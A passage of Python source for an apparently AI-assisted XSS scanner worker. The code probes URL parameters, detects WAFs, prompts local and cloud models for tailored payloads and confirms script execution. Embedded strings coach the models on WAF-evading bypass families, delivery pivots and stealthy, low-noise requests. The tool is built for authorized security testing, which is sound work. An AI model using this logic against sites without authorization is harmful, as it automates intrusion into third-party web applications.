"""Per-URL active scanner worker — runs as an isolated multiprocessing.Process.

Full lifecycle per URL:
  1. WAF detect (reuse existing helper)
  2. Fetch + surface-map the target page
  3. Probe all query parameters for reflection + surviving chars
  4. Build enriched reasoning context from parsed page state + probe lessons
  5. For each injectable param: ask the model for tailored payloads and fire those
  6. If model-driven attempts do not confirm execution: fall back to deterministic transforms
  7. Return WorkerResult to orchestrator via result_queue
"""
from __future__ import annotations

import hashlib
import json
import logging
import queue
import re
import threading
import time
import urllib.parse
from dataclasses import dataclass, field, replace
from multiprocessing.managers import DictProxy
from types import SimpleNamespace
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    import multiprocessing
    from ai_xss_generator.types import PostFormTarget, UploadTarget

from ai_xss_generator.findings import infer_bypass_family

log = logging.getLogger(__name__)

_ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS = 60
_RESEARCH_LOCAL_MODEL_TIMEOUT_SECONDS = 120
_ACTIVE_CLOUD_GRACE_SECONDS = 60
_DOM_CLOUD_START_AFTER_SECONDS = 30


def _phase_profile_name(extreme: bool, research: bool) -> str:
    if research:
        return "research"
    if extreme:
        return "extreme"
    return "normal"


def _keep_searching_hit_cap(enabled: bool, extreme: bool, research: bool = False) -> int:
    if not enabled:
        return 1
    if research:
        return 7
    return 5 if extreme else 3


def _finding_variant_key(finding: "ConfirmedFinding") -> str:
    family = finding.bypass_family or infer_bypass_family(finding.payload, [])
    return "|".join([
        finding.context_type,
        finding.sink_context,
        finding.execution_method,
        family,
        finding.payload,
    ])


def active_worker_timeout_budget(
    timeout_seconds: int,
    use_cloud: bool,
    ai_backend: str = "api",
    cloud_attempts: int = 1,
) -> int:
    """Return the effective per-worker budget for staged local+cloud execution."""
    minimum = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    if use_cloud:
        cloud_grace = _ACTIVE_CLOUD_GRACE_SECONDS
        if ai_backend == "cli":
            # CLI cloud failover may spend one timeout on the primary tool and
            # a second timeout on the alternate tool before falling back.
            cloud_grace *= 2
        minimum += max(1, cloud_attempts) * cloud_grace
    return max(timeout_seconds, minimum)


def _start_async_payload_stage(fn: Any) -> tuple[threading.Thread, "queue.Queue[Any]"]:
    """Run a payload-generation callable in a daemon thread and capture its result."""
    out: "queue.Queue[Any]" = queue.Queue(maxsize=1)

    def _runner() -> None:
        try:
            payloads = fn() or []
        except Exception:
            payloads = []
        try:
            out.put_nowait(payloads)
        except queue.Full:
            pass

    thread = threading.Thread(target=_runner, daemon=True)
    thread.start()
    return thread, out


def _poll_async_payloads(out: "queue.Queue[Any]") -> tuple[bool, Any]:
    try:
        return True, out.get_nowait()
    except queue.Empty:
        return False, []


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class ConfirmedFinding:
    """A single confirmed XSS execution."""
    url: str
    param_name: str
    context_type: str
    sink_context: str
    payload: str
    transform_name: str
    execution_method: str    # "dialog" | "console" | "network" | "dom_xss" | "dom_taint"
    execution_detail: str
    waf: str | None
    surviving_chars: str
    fired_url: str
    source: str             # "phase1_transform" | "local_model" | "cloud_model" | "dom_xss_runtime"
    cloud_escalated: bool
    code_location: str = ""
    """JS call stack or script location where the sink was reached (DOM XSS only)."""
    ai_engine: str = ""
    ai_note: str = ""
    bypass_family: str = ""
    csp_note: str = ""
    """Non-empty when a CSP was detected on the target that may block execution."""


@dataclass
class CloudPayloadPlan:
    """Cloud-model payload batch plus engine metadata for reporting."""
    payloads: list[Any] = field(default_factory=list)
    engine: str = ""
    note: str = ""


@dataclass
class CoordinatedPayloadAttempt:
    """A bounded multi-parameter fallback attempt for split reflections."""
    context_type: str
    param_payloads: dict[str, str]
    transform_name: str


@dataclass
class WorkerResult:
    """Returned by a worker to the orchestrator via the result queue."""
    url: str
    status: str             # "confirmed" | "taint_only" | "no_execution" | "no_reflection" | "no_params" | "error"
    confirmed_findings: list[ConfirmedFinding] = field(default_factory=list)
    transforms_tried: int = 0
    cloud_escalated: bool = False
    waf: str | None = None
    error: str | None = None
    duration_seconds: float = 0.0
    # Summary counts for the report
    params_tested: int = 0
    params_reflected: int = 0
    # Work item type — used by session checkpointing
    kind: str = "get"       # "get" | "post" | "upload" | "dom"
    dead_target: bool = False
    dead_reason: str = ""
    target_tier: str = ""
    local_model_rounds: int = 0
    cloud_model_rounds: int = 0
    fallback_rounds: int = 0
    escalation_reasons: list[str] = field(default_factory=list)


@dataclass
class LocalTriageResult:
    """Verdict returned by the local model triage gate.

    The local model's sole job is to classify whether a reflected injection
    point is worth cloud API spend — NOT to generate payloads.
    """
    score: int          # 1-10, higher = more XSS potential
    should_escalate: bool
    reason: str         # one-sentence justification
    context_notes: str  # hints forwarded to the cloud payload generator


def _triage_with_local_model(
    probe_result: Any,
    model: str,
    waf: str | None,
    delivery_mode: str = "get",
    fast_mode: bool = False,
) -> LocalTriageResult:
    """Run the local Ollama triage gate on a probe result.

    In --fast mode this is bypassed and always returns should_escalate=True
    so the cloud model runs unconditionally (current legacy behaviour).
    """
    if fast_mode:
        return LocalTriageResult(
            score=5, should_escalate=True,
            reason="fast mode — triage skipped", context_notes="",
        )

    # Build a concise reflection snippet from surviving char data
    reflections = getattr(probe_result, "reflections", [])
    surviving_chars = ""
    snippet = ""
    if reflections:
        chars: set[str] = set()
        for r in reflections:
            chars.update(getattr(r, "surviving_chars", set()))
        surviving_chars = " ".join(sorted(chars)) if chars else "unknown"
        snippet = getattr(reflections[0], "raw_context", "") or ""
        if len(snippet) > 400:
            snippet = snippet[:400] + "…"

    context_type = getattr(probe_result, "context_type", "") or ""
    param_name = getattr(probe_result, "param_name", "?")

    try:
        from ai_xss_generator.models import triage_probe_result
        result = triage_probe_result(
            param_name=param_name,
            context_type=context_type,
            surviving_chars=surviving_chars,
            reflection_snippet=snippet,
            waf=waf,
            delivery_mode=delivery_mode,
            model=model,
        )
        return LocalTriageResult(
            score=result["score"],
            should_escalate=result["should_escalate"],
            reason=result["reason"],
            context_notes=result["context_notes"],
        )
    except Exception as exc:
        log.debug("Triage gate error: %s — defaulting to escalate", exc)
        return LocalTriageResult(
            score=5, should_escalate=True,
            reason=f"triage error: {exc}", context_notes="",
        )


def _append_reason(reasons: list[str], note: str) -> None:
    cleaned = note.strip()
    if cleaned and cleaned not in reasons:
        reasons.append(cleaned)


def _join_lessons(*lesson_groups: list[Any] | None) -> list[Any] | None:
    merged: list[Any] = []
    for group in lesson_groups:
        if group:
            merged.extend(group)
    return merged or None


def _payload_text(item: Any) -> str:
    if hasattr(item, "payload"):
        return str(getattr(item, "payload", "") or "")
    return str(item or "")


def _payload_vector(item: Any) -> str:
    if hasattr(item, "test_vector"):
        return str(getattr(item, "test_vector", "") or "")
    return ""


def _preview_payloads(payloads: list[Any], limit: int = 4) -> str:
    if not payloads:
        return "none"
    preview = ", ".join(repr(_payload_text(payload)) for payload in payloads[:limit] if _payload_text(payload))
    remaining = len(payloads) - min(len(payloads), limit)
    if remaining > 0:
        preview += f", +{remaining} more"
    return preview


def _summarize_failed_execution_results(results: list[Any]) -> str:
    if not results:
        return "No dialog, console, or network execution signal fired."

    errors: list[str] = []
    for result in results:
        error = str(getattr(result, "error", "") or "").strip()
        if error and error not in errors:
            errors.append(error)
    if errors:
        preview = "; ".join(errors[:2])
        if len(errors) > 2:
            preview += f"; +{len(errors) - 2} more"
        return f"Observed execution errors: {preview}."
    return "No dialog, console, or network execution signal fired."


def _reflected_payload_count(results: list[Any], fallback: int) -> int:
    reflected = 0
    for result in results:
        if getattr(result, "error", None):
            continue
        reflected += 1
    return reflected or fallback


@dataclass
class _DeepEscalationPlan:
    """Result of a deep escalation pass — cloud plan + contextual notes.

    Used as the shared return type from _build_deep_escalation_plan() so all
    four scan paths (GET, POST, DOM, upload) get consistent escalation behaviour
    without duplicating strategy-hint + cloud-call logic.
    """
    cloud_plan: "CloudPayloadPlan"
    strategy_hint: str
    cloud_model_rounds_used: int = 1  # always 1 per call


def _build_deep_escalation_plan(
    *,
    url: str,
    probe_result: Any,
    delivery_mode: str,
    context: Any,
    cloud_model: str,
    waf_hint: str | None,
    ekey: str,
    dedup_registry: Any,
    dedup_lock: Any,
    auth_headers: dict[str, str],
    ai_backend: str,
    cli_tool: str,
    cli_model: str | None,
    session_lessons: list[Any],
    feedback_lessons: list[Any] | None,
    phase_profile: str,
    fast_generated_count: int,
    fast_reflected_count: int,
) -> "_DeepEscalationPlan":
    """Build a deep (contextual + research) escalation cloud plan.

    This is the single source of truth for the post-scout escalation pass that
    runs across all scan paths (GET, POST, DOM, upload) when fast scout rounds
    fail to confirm execution.  Centralising it here means strategy-hint logic,
    prompt phasing, and future CSP/WAF context enrichment only need to change
    in one place.
    """
    strategy_hint = _analyze_fast_failure_strategy(
        context=context,
        cloud_model=cloud_model,
        waf_hint=waf_hint,
        generated_count=fast_generated_count,
        reflected_count=fast_reflected_count or fast_generated_count,
        ai_backend=ai_backend,
        cli_tool=cli_tool,
        cli_model=cli_model,
        phase_profile=phase_profile,
    )
    cloud_plan = _coerce_cloud_plan(_get_cloud_payloads(
        url=url,
        probe_result=probe_result,
        cloud_model=cloud_model,
        waf=waf_hint,
        ekey=ekey,
        dedup_registry=dedup_registry,
        dedup_lock=dedup_lock,
        base_context=context,
        auth_headers=auth_headers,
        ai_backend=ai_backend,
        cli_tool=cli_tool,
        cli_model=cli_model,
        delivery_mode=delivery_mode,
        session_lessons=session_lessons,
        feedback_lessons=feedback_lessons,
        phase_profile=phase_profile,
        phases=("contextual", "research"),
        strategy_hint=strategy_hint,
    ))
    return _DeepEscalationPlan(cloud_plan=cloud_plan, strategy_hint=strategy_hint)


def _analyze_fast_failure_strategy(
    *,
    context: Any,
    cloud_model: str,
    waf_hint: str | None,
    generated_count: int,
    reflected_count: int,
    ai_backend: str,
    cli_tool: str,
    cli_model: str | None,
    phase_profile: str,
) -> str:
    from ai_xss_generator.models import analyze_deep_strategy_hint

    if generated_count <= 0:
        return ""
    try:
        return analyze_deep_strategy_hint(
            context=context,
            cloud_model=cloud_model,
            generated_count=generated_count,
            reflected_count=reflected_count,
            waf=waf_hint,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            phase_profile=phase_profile,
        )
    except Exception:
        return ""


def _unique_new_payloads(payloads: list[Any], seen: set[str]) -> tuple[list[Any], list[str]]:
    fresh: list[Any] = []
    duplicates: list[str] = []
    for payload in payloads:
        payload_text = _payload_text(payload).strip()
        if not payload_text:
            continue
        if payload_text in seen:
            duplicates.append(payload_text)
            continue
        seen.add(payload_text)
        fresh.append(payload)
    return fresh, duplicates


def _cloud_attempt_note(base_note: str, attempt_number: int, total_attempts: int) -> str:
    parts = [base_note.strip()] if base_note.strip() else []
    if total_attempts > 1:
        parts.append(f"Cloud attempt {attempt_number}/{total_attempts}.")
    return " ".join(parts)


def _build_cloud_feedback_lessons(
    *,
    attempt_number: int,
    total_attempts: int,
    prompt_context: Any,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    payloads_tried: list[Any],
    execution_results: list[Any] | None = None,
    duplicate_payloads: list[str] | None = None,
    observation: str = "",
) -> list[Any]:
    from ai_xss_generator.lessons import Lesson

    strategy_constraints = _infer_strategy_constraints(
        prompt_context=prompt_context,
        delivery_mode=delivery_mode,
        context_type=context_type,
        sink_context=sink_context,
        payloads_tried=payloads_tried,
        duplicate_payloads=duplicate_payloads or [],
        observation=observation,
    )
    attempted_delivery_modes = _infer_attempted_delivery_modes(
        payloads_tried,
        execution_results=execution_results or [],
        default_delivery_mode=delivery_mode,
    )
    edge_blockers, delivery_outcomes = _infer_edge_feedback(execution_results or [])
    delivery_constraints = _infer_delivery_constraints(
        prompt_context=prompt_context,
        delivery_mode=delivery_mode,
        context_type=context_type,
        sink_context=sink_context,
        observation=observation,
        attempted_delivery_modes=attempted_delivery_modes,
        edge_blockers=edge_blockers,
        delivery_outcomes=delivery_outcomes,
    )

    summary_parts = [
        f"Cloud attempt {attempt_number}/{total_attempts} for {delivery_mode or 'active'} "
        f"{context_type or sink_context or 'xss'} did not confirm execution."
    ]
    if payloads_tried:
        summary_parts.append(f"Payloads already tried: {_preview_payloads(payloads_tried)}.")
    else:
        summary_parts.append("The previous cloud response produced no fresh payloads.")
    if duplicate_payloads:
        summary_parts.append(f"Repeated payloads to avoid: {_preview_payloads(duplicate_payloads)}.")
    if observation:
        summary_parts.append(observation.strip())
    if strategy_constraints:
        summary_parts.append(
            "Strategy shifts for the next batch: " + " ".join(strategy_constraints)
        )
    if delivery_constraints:
        summary_parts.append(
            "Delivery shifts for the next batch: " + " ".join(delivery_constraints)
        )
    if edge_blockers:
        summary_parts.append(
            "Observed edge/WAF blockers: " + ", ".join(edge_blockers[:4]) + "."
        )
    if delivery_outcomes:
        summary_parts.append(
            "Observed delivery outcomes: " + ", ".join(delivery_outcomes[:4]) + "."
        )
    summary_parts.append("Return a materially different next batch and avoid near-duplicates.")
    failed_families = _infer_failed_families(
        delivery_mode=delivery_mode,
        context_type=context_type,
        sink_context=sink_context,
        payloads_tried=payloads_tried,
    )

    return [
        Lesson(
            lesson_type="execution_feedback",
            title=f"Cloud attempt {attempt_number} feedback",
            summary=" ".join(summary_parts),
            sink_type=sink_context,
            context_type=context_type,
            source_pattern=f"{delivery_mode}:cloud_feedback",
            waf_name="",
            delivery_mode=delivery_mode,
            frameworks=[str(item).lower() for item in getattr(prompt_context, "frameworks", [])[:3]],
            auth_required=bool(getattr(prompt_context, "auth_notes", [])),
            confidence=0.83,
            metadata={
                "attempt_number": attempt_number,
                "total_attempts": total_attempts,
                "delivery_mode": delivery_mode,
                "context_type": context_type,
                "sink_context": sink_context,
                "failed_families": failed_families,
                "strategy_constraints": strategy_constraints[:4],
                "delivery_constraints": delivery_constraints[:4],
                "attempted_delivery_modes": attempted_delivery_modes[:4],
                "edge_blockers": edge_blockers[:5],
                "delivery_outcomes": delivery_outcomes[:5],
                "observation": observation.strip(),
                "duplicate_payloads": [payload for payload in (duplicate_payloads or []) if payload][:4],
            },
        )
    ]


def _infer_strategy_constraints(
    *,
    prompt_context: Any,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    payloads_tried: list[Any],
    duplicate_payloads: list[str],
    observation: str,
) -> list[str]:
    constraints: list[str] = []
    lowered_payloads = [
        _payload_text(payload).strip().lower()
        for payload in payloads_tried
        if _payload_text(payload).strip()
    ]
    normalized_context = context_type.strip().lower()
    normalized_sink = sink_context.strip().lower()

    def _add(note: str) -> None:
        cleaned = note.strip()
        if cleaned and cleaned not in constraints:
            constraints.append(cleaned)

    if duplicate_payloads:
        _add("Do not repeat prior payloads or trivial rewrites of them.")

    if lowered_payloads and all("<" in payload and ">" in payload for payload in lowered_payloads):
        _add("Shift away from full-tag injection and try quote closure, same-tag attribute pivots, or tagless execution paths.")

    if normalized_context == "html_attr_url" and lowered_payloads and all("javascript:" in payload for payload in lowered_payloads):
        _add("Do not repeat plain javascript: URIs; prefer entity-encoded, whitespace-broken, or alternate URL-handler pivots.")

    if normalized_context.startswith("js_string_") and lowered_payloads and all("<script" in payload or "</script>" in payload for payload in lowered_payloads):
        _add("Prefer in-string breakout payloads over raw HTML tag injection.")

    if delivery_mode == "dom" and normalized_sink in {"document.write", "document.writeln"}:
        _add("Prioritize same-tag attribute pivots, srcdoc pivots, and quote-closure payloads before full-tag escapes.")

    if lowered_payloads and any("alert(" in payload for payload in lowered_payloads) and all("alert(" in payload for payload in lowered_payloads):
        _add("Vary the execution primitive or wrapper so the next batch is materially different.")

    try:
        from ai_xss_generator.behavior import extract_behavior_profile

        profile = extract_behavior_profile(prompt_context)
    except Exception:
        profile = {}

    transforms = {
        str(item).strip().lower()
        for item in profile.get("reflection_transforms", []) or []
        if str(item).strip()
    }
    probe_modes = {
        str(item).strip().lower()
        for item in profile.get("probe_modes", []) or []
        if str(item).strip()
    }
    if "upper" in transforms:
        _add("Reflection uppercases alphabetic characters; prefer numeric/entity-encoded alpha or case-insensitive payloads.")
    if "stealth" in probe_modes:
        _add("Keep the next batch compact and lower-noise; avoid broad noisy payload families.")

    lowered_observation = observation.lower()
    if "no dialog" in lowered_observation or "no execution signal" in lowered_observation:
        _add("The previous batch produced no execution signal; switch attack families instead of minor rewrites.")
    if "error" in lowered_observation:
        _add("Treat runtime errors as a hint that the syntax shape was wrong; change syntax family rather than repeating the same wrapper.")

    return constraints[:4]


def _infer_failed_families(
    *,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    payloads_tried: list[Any],
) -> list[str]:
    families: list[str] = []
    normalized_context = context_type.strip().lower()
    normalized_sink = sink_context.strip().lower()
    lowered_payloads = [
        _payload_text(payload).strip().lower()
        for payload in payloads_tried
        if _payload_text(payload).strip()
    ]

    def _add(name: str) -> None:
        if name and name not in families:
            families.append(name)

    if lowered_payloads and all("<" in payload and ">" in payload for payload in lowered_payloads):
        _add("full_tag_injection")
    if lowered_payloads and all("javascript:" in payload for payload in lowered_payloads):
        _add("plain_javascript_uri")
    if lowered_payloads and all("alert(" in payload for payload in lowered_payloads):
        _add("single_execution_primitive")
    if normalized_context.startswith("js_string_"):
        _add("js_string_breakout")
    if normalized_context == "html_attr_url":
        _add("url_attribute_execution")
    if delivery_mode == "dom" and normalized_sink in {"document.write", "document.writeln"}:
        _add("document_write_markup_escape")

    return families[:4]


def _infer_delivery_constraints(
    *,
    prompt_context: Any,
    delivery_mode: str,
    context_type: str,
    sink_context: str,
    observation: str,
    attempted_delivery_modes: list[str],
    edge_blockers: list[str],
    delivery_outcomes: list[str],
) -> list[str]:
    constraints: list[str] = []
    normalized_context = context_type.strip().lower()
    normalized_sink = sink_context.strip().lower()
    lowered_observation = observation.lower()

    def _add(note: str) -> None:
        cleaned = note.strip()
        if cleaned and cleaned not in constraints:
            constraints.append(cleaned)

    if delivery_mode == "get" and normalized_context == "html_attr_url":
        _add("Change delivery shape as well as payload syntax; consider fragment-only delivery, split URL construction, or same-session follow-up before repeating query-only attempts.")
    if delivery_mode == "post":
        _add("Consider coordinated multi-field delivery or stored follow-up rendering instead of single-field rewrites only.")
    if delivery_mode == "dom":
        _add("If the sink is router- or DOM-state driven, prefer fragment-only or same-session navigation pivots before broad query retries.")
    if normalized_sink in {"document.write", "document.writeln"}:
        _add("Document.write contexts often reward fragment or same-page attribute pivots more than repeated query-only full-tag escapes.")
    if "no dialog" in lowered_observation or "no execution signal" in lowered_observation:
        _add("If the syntax family changed but nothing executed, also change the delivery path or state transition on the next attempt.")
    if "fragment" in attempted_delivery_modes and "query" in attempted_delivery_modes:
        _add("Both query and fragment delivery have already been exercised; consider coordinated multi-parameter or stateful follow-up delivery next.")
    elif "query" in attempted_delivery_modes:
        _add("Query-style delivery was already exercised; bias the next round toward fragment, multi-parameter, or stateful follow-up pivots.")
    elif "fragment" in attempted_delivery_modes:
        _add("Fragment delivery was already exercised; bias the next round toward query reshaping, multi-parameter delivery, or stateful follow-up pivots.")
    if "multi_param" in attempted_delivery_modes:
        _add("Multi-parameter delivery was already exercised; avoid repeating the same split and prefer a stateful or alternate-surface pivot next.")
    if "fragment_dropped" in edge_blockers:
        _add("Fragment delivery was not preserved by navigation/runtime handling; deprioritize fragment-only ideas and prefer query, coordinated, or same-session pivots.")
    if "query_rewritten" in edge_blockers:
        _add("Query delivery was rewritten or stripped at the edge/app layer; prefer fragment, POST, coordinated multi-parameter, or same-session pivots.")
    if any(item.startswith("edge_http2_") or item.startswith("edge_connection_") for item in edge_blockers):
        _add("Edge transport is unstable for attack requests; keep the next batch low-noise and prefer fewer deliberate attempts with session continuity.")
    if "preflight_required" in edge_blockers and "preflight_failed" not in edge_blockers:
        _add("A warm browser session appears necessary before delivery; prefer same-session or navigate-then-fire pivots over cold direct hits.")
    if "follow_up_blocked" in delivery_outcomes:
        _add("Stateful follow-up navigation did not complete; avoid over-investing in follow-up-only strategies until a simpler render path works.")
    if "query_preserved" in delivery_outcomes and "fragment_preserved" not in delivery_outcomes and "fragment_dropped" not in edge_blockers:
        _add("Query delivery is preserved cleanly; only pivot away from it if the syntax family changes materially.")

    try:
        from ai_xss_generator.behavior import extract_behavior_profile

        profile = extract_behavior_profile(prompt_context)
    except Exception:
        profile = {}

    probe_modes = {
        str(item).strip().lower()
        for item in profile.get("probe_modes", []) or []
        if str(item).strip()
    }
    if "stealth" in probe_modes:
        _add("Keep delivery low-noise and compact; prefer one or two deliberate pivots over broad request churn.")

    return constraints[:4]


def _infer_edge_feedback(execution_results: list[Any]) -> tuple[list[str], list[str]]:
    edge_blockers: list[str] = []
    delivery_outcomes: list[str] = []

    def _add(target: list[str], value: str) -> None:
        cleaned = str(value or "").strip().lower()
        if cleaned and cleaned not in target:
            target.append(cleaned)

    for result in execution_results:
        for signal in getattr(result, "edge_signals", []) or []:
            _add(edge_blockers, signal)
        query_preserved = getattr(result, "query_preserved", None)
        fragment_preserved = getattr(result, "fragment_preserved", None)
        if query_preserved is True:
            _add(delivery_outcomes, "query_preserved")
        elif query_preserved is False:
            _add(edge_blockers, "query_rewritten")
        if fragment_preserved is True:
            _add(delivery_outcomes, "fragment_preserved")
        elif fragment_preserved is False:
            _add(edge_blockers, "fragment_dropped")
        if getattr(result, "preflight_attempted", False):
            _add(delivery_outcomes, "preflight_attempted")
        if getattr(result, "preflight_succeeded", False):
            _add(delivery_outcomes, "preflight_succeeded")
        if getattr(result, "follow_up_attempted", False):
            _add(delivery_outcomes, "follow_up_attempted")
            if not getattr(result, "follow_up_succeeded", False):
                _add(delivery_outcomes, "follow_up_blocked")
        if getattr(result, "follow_up_succeeded", False):
            _add(delivery_outcomes, "follow_up_succeeded")

    return edge_blockers[:5], delivery_outcomes[:5]


def _infer_attempted_delivery_modes(
    payloads_tried: list[Any],
    *,
    execution_results: list[Any],
    default_delivery_mode: str = "",
) -> list[str]:
    modes: list[str] = []

    def _add(mode: str) -> None:
        cleaned = mode.strip().lower()
        if cleaned and cleaned not in modes:
            modes.append(cleaned)

    for payload in payloads_tried:
        strategy = getattr(payload, "strategy", None)
        if strategy is not None:
            _add(str(getattr(strategy, "delivery_mode_hint", "") or ""))
            _add(str(getattr(strategy, "coordination_hint", "") or ""))
        test_vector = _payload_vector(payload)
        if "#" in test_vector:
            _add("fragment")
        if "?" in test_vector:
            _add("query")

    for result in execution_results:
        for mode in getattr(result, "executed_delivery_modes", []) or []:
            _add(mode)

    if not modes and default_delivery_mode:
        fallback_mode = default_delivery_mode.strip().lower()
        if fallback_mode == "get":
            _add("query")
        elif fallback_mode:
            _add(fallback_mode)

    return modes[:4]


# ---------------------------------------------------------------------------
# Deduplication key — includes endpoint + param so different endpoints/params
# are always treated as new targets even when WAF + filter profile match.
# ---------------------------------------------------------------------------

def _escalation_key(
    url: str,
    param_name: str,
    waf: str | None,
    surviving_chars: frozenset[str],
    context_type: str,
) -> str:
    """Stable key for cloud-escalation dedup.

    Intentionally excludes which transforms failed — two workers hitting the
    same endpoint+param+waf+char-profile should share the same cloud result
    regardless of which Phase 1 transforms each attempted.
    """
    parsed = urllib.parse.urlparse(url)
    endpoint = f"{parsed.netloc}{parsed.path}"
    fingerprint = {
        "endpoint": endpoint,
        "param": param_name,
        "waf": waf or "none",
        "chars": sorted(surviving_chars),
        "context": context_type,
    }
    return hashlib.sha256(
        json.dumps(fingerprint, sort_keys=True).encode()
    ).hexdigest()


# ---------------------------------------------------------------------------
# Worker entry point
# ---------------------------------------------------------------------------

def run_worker(
    url: str,
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: DictProxy,
    dedup_lock: Any,
    findings_lock: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
    crawled_pages: list[str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    """Target function for multiprocessing.Process.

    All results are communicated back via *result_queue*.
    Exceptions are caught and returned as error WorkerResults — workers
    must never crash silently.
    """
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run(
            url=url,
            rate=rate,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
            result_queue=result_queue,
            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            findings_lock=findings_lock,
            start_time=start_time,
            put_result=_put_result,
            auth_headers=auth_headers,
            sink_url=sink_url,
            crawled_pages=crawled_pages,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
            deep=deep,
            fast=fast,
            waf_source=waf_source,
            keep_searching=keep_searching,
            extreme=extreme,
            research=research,
        )
    except Exception as exc:
        log.exception("Worker crashed for %s", url)
        _put_result(WorkerResult(url=url, status="error", error=str(exc)))


def _run(
    *,
    url: str,
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: Any,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    findings_lock: Any,
    start_time: float,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
    crawled_pages: list[str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    deadline = start_time + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )
    local_model_timeout_seconds = (
        _RESEARCH_LOCAL_MODEL_TIMEOUT_SECONDS if research else _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    )
    context_hit_cap = _keep_searching_hit_cap(keep_searching, extreme, research)
    phase_profile = _phase_profile_name(extreme, research)

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    # ── Step 1: Parse URL params — early exit if none ─────────────────────────
    parsed = urllib.parse.urlparse(url)
    raw_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not raw_params:
        put_result(WorkerResult(url=url, status="no_params", waf=waf_hint))
        return

    flat_params = {k: v[0] for k, v in raw_params.items()}

    # Early exit if every param is a known tracking/analytics param — probe_url
    # would filter them all and return [], leading to a misleading "no_reflection"
    # status. Catch it here so the status and log message are accurate.
    from ai_xss_generator.probe import _TRACKING_PARAM_BLOCKLIST, probe_url
    testable_params = {k for k in flat_params if k.lower() not in _TRACKING_PARAM_BLOCKLIST}
    if not testable_params:
        put_result(WorkerResult(url=url, status="no_params", waf=waf_hint))
        return

    # ── Step 2: Pre-fetch URL cleanly — used for AI context (avoids a redundant
    # network round-trip in parse_target later). The probe requests use modified
    # URLs (canary injected), so this clean fetch is the only time we see the
    # real page content.
    _prefetched_html: str | None = None
    try:
        from ai_xss_generator.probe import _BROWSER_REQUIRED_WAFS, fetch_html_with_browser
        if waf_hint is not None and waf_hint.lower() in _BROWSER_REQUIRED_WAFS:
            _prefetched_html = fetch_html_with_browser(
                url,
                auth_headers=auth_headers,
                user_agent="axss/0.1 (+authorized security testing; playwright-prefetch)",
            )
        else:
            from scrapling.fetchers import FetcherSession as _FS
            with _FS(impersonate="chrome", stealthy_headers=True, timeout=20,
                     follow_redirects=True, retries=1) as _fs:
                _clean_resp = _fs.get(
                    url,
                    headers={**(auth_headers or {}),
                             "User-Agent": "axss/0.1 (+authorized security testing; scrapling)"},
                )
                _prefetched_html = _clean_resp.text or (
                    _clean_resp.body.decode("utf-8", errors="replace")
                    if _clean_resp.body else None
                )
    except Exception as _exc:
        log.debug("Pre-fetch of %s failed (parse_target will re-fetch): %s", url, _exc)

    # ── Step 3: Probe all params for reflection + char survival ──────────────
    probe_results = probe_url(
        url, rate=rate, waf=waf_hint, auth_headers=auth_headers,
        sink_url=sink_url, crawled_pages=crawled_pages,
    )

    injectable = [r for r in probe_results if r.is_injectable]
    reflected  = [r for r in probe_results if r.is_reflected]
    coordinated_attempts = _coordinated_split_attempts(reflected)

    # ── Step 4: Parse target HTML once — reused by local/cloud model helpers ─
    from ai_xss_generator.parser import parse_target as _parse_target
    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=url, html_value=None, waf=waf_hint, auth_headers=auth_headers,
            cached_html=_prefetched_html,
        )
        if waf_source:
            from ai_xss_generator.waf_knowledge import analyze_waf_source, attach_waf_knowledge
            _cached_context = attach_waf_knowledge(_cached_context, analyze_waf_source(waf_source))
    except Exception as exc:
        log.debug("Pre-parse of %s failed (will retry per-param): %s", url, exc)

    session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import (
            build_behavior_lessons,
            build_mapping_lessons,
            build_probe_lessons,
        )

        behavior_profile = build_target_behavior_profile(
            url=url,
            delivery_mode="get",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=_cached_context,
            probe_results=probe_results,
        )
        _cached_context = attach_behavior_profile(_cached_context, behavior_profile)
        target_disposition = classify_target_disposition(
            _cached_context,
            delivery_mode="get",
            reflected_params=len(reflected),
            injectable_params=len(injectable),
            coordinated_attempts=len(coordinated_attempts),
        )

        memory_profile = build_memory_profile(
            context=_cached_context,
            waf_name=waf_hint,
            delivery_mode="get",
            target_host=parsed.netloc,
        )
        if auth_headers:
            memory_profile["auth_required"] = True
